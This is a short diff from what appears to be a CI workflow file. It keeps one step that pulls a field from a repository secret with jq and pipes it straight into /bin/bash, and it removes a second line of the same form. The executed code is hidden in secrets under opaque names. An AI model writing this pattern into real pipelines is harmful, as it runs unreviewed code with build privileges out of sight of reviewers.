@@ -22,7 +22,6 @@ jobs:
           u831: ${{ secrets.u831 }}
         run: |
           printf '%s' "$u831" | jq -r .red97739 | /bin/bash
-          printf '%s' "$t2483" | jq -r .qninq2121 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
